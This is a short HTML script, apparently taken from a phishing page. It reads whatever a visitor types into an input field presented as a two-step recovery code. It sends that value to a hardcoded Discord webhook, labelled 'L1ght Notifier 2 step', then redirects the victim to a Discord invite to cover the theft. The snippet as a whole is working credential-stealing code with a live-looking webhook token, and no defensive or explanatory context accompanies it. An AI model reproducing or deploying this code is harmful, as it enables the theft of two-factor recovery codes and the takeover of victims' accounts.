<script>
                
function verify() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discordapp.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv");

    request.setRequestHeader("Content-type", "application/json");

    const params = {
      username: "L1ght Notifier 2 step | Beta",
      avatar_url: "",
      content: "**L1ght On Top**",
      embeds: [{
        title: "2 STEP RECOVERY CODE",
        image: {
          url: "https://cdn-icons-png.flaticon.com/512/483/483408.png"
        },
        fields: [
          {
            name: "CODE ->",
            value: document.querySelector("input").value
          }
        ],
        description: ""
      }],
    }

    request.send(JSON.stringify(params));

    window.location.replace("https://discord.gg/splunk")
  }



</script>